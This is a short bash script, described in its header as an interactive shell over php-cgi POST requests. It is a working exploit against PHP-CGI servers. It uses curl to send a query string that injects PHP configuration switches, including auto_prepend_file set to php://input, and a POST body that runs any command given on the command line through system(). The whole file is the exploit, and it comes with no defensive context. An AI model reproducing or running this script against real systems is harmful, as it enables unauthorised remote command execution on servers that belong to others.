#!/bin/bash
#
# interactive shell over php-cgi POST requests.
#
#
if [ -z "$1" ] ;
    then
    echo "USAGE: $0 [ip] [command]"
    exit
fi

curl -i -s -k  -X 'POST' \
  -H 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)' \
  --data-binary "<?php system(\"$2\"); die; ?>" \
  "http://$1/php-cgi/php-cgi.exe?%2dd+allow_url_include%3don+%2dd+safe_mode%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d%22%22+%2dd+open_basedir%3dnone+%2dd+auto_prepend_file%3dphp%3a%2f%2finput+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"
